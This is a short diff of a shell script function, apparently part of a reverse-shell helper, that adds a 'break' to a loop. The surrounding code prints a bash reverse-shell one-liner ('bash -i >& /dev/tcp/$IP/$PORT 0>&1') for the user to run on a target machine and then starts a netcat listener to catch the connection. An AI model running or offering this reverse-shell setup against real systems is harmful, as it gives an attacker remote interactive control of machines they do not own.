@@ -57,6 +57,7 @@ rs(){
   do
     echo "You selected $IP"
     echo "Run the following command: bash -i >& /dev/tcp/$IP/$PORT 0>&1"
+    break
   done
   nc -nvlk "$PORT"
 }
